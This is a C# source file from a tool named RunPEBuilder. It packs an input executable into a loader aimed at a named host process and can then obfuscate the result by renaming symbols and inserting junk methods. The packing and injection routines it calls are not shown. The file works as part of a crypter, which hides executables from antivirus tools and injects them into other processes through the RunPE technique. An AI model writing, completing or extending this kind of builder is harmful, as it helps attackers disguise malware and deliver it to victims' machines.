using dnlib.DotNet;
using System;
using System.IO;

namespace RunPEBuilder.Include
{
    internal class Runtime
    {
        public static string RuntimeMain(string InFile, string OutFile, string processName, bool obfuscate)
        {
            if (new FileInfo(InFile).Length == 0)
            {
                return $"Error: Input file {InFile} is empty.";
            }
            try
            {
                byte[] packedBytes = PckMethod.Pack(File.ReadAllBytes(InFile), processName, PckMethod.DotNetVersion.v4_0);
                if (packedBytes == null)
                {
                    return "Error: Packing failed.";
                }

                File.WriteAllBytes(OutFile, packedBytes);
                if (obfuscate)
                {
                    // Rename output file for obfuscation
                    string tempFile = Path.Combine(Path.GetDirectoryName(OutFile), $"sample_{Path.GetFileName(OutFile)}");
                    File.Move(OutFile, tempFile);

                    // Load the module from the temp file without locking it
                    using (var stream = new FileStream(tempFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        var module = ModuleDefMD.Load(stream);

                        // Execute obfuscation
                        RenameProtector.Execute(module, tempFile);
                        JunkMethods.Execute(module, tempFile);

                        // Ensure to write the module after closing the stream
                        module.Write(tempFile);
                    }

                    // Move back to original output file
                    File.Move(tempFile, OutFile);
                }
                return "File builded and obfuscated successfully!";
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }
    }
}
